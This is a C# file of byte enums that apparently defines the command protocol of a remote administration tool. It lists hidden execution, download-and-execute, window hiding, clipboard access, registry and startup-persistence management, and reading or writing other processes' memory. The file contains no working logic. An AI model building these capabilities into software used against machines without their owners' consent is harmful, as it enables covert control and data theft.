namespace SharedCode.Network
{
    public enum NetworkCommand : byte
    {
        TaskManager,
        Ping,
        Pong,
        RegistryEdit,
        FileManager,
        Execute,
        ExecuteHidden,
        Close,
        Restart,
        DeleteFile,
        DownloadAndExecute,
        DownloadFile,
        KillProcess,
        SuspendProcess,
        ResumeProcess,
        Console,
        HideWindow,
        Clipboard,
        StartupManager,
        Connections
    }

    public enum ConnectionsCommand : byte
    {
        GetTable,
        Table
    }

    public enum StartupManagerCommand : byte
    {
        GetStartupItems,
        StartupItems
    }

    public enum StartupType : byte
    {
        HKCU,
        HKCUO,
        HKLM,
        HKLMO
    }

    public enum ConsoleCommand : byte
    {
        SendCommand,
        Responce
    }
    public enum ClipboardCommand : byte
    {
        SetText,
        GetText,
        Text
    }
    public enum FileManagerCommand : byte
    {
        DriveResponce,
        DirectoryResponce,
        Update,
        UpdateToSpecialFolder,
        Invalid,
        StartDownload,
        DownloadInvalid,
        DownloadBlock,
        MoveFile,
        ForceMoveFile,
        CopyFile,
        RenameFile,
        MoveResponce,
        CopyResponce,
        GetFileProperties,
        PropertiesResponce,
        PropertiesFailed
    }

    public enum TaskManagerCommand : byte
    {
        GetProcesses,
        ProcessList,
        WriteMemory,
        ReadMemory,
        GetModules,
        InvalidProcess,
        ModuleResponce,
        MemoryValue
    }

    public enum RegistryCommand : byte
    {
        UpdateNodes,
        UpdateNodeResponce,
        UpdateKeys,
        EmptyNode,
        ValueResponce,
        NodeDeniedAccess,
        ValueDeniedAccess,
        SetValue,
        DeleteValue
    }
    public enum RegistryKeyType :byte
    {
        None,
        CurrentUser,
        LocalMachine,
        ClassesRoot,
        UserRoot,
        CurrentConfig
    }

}
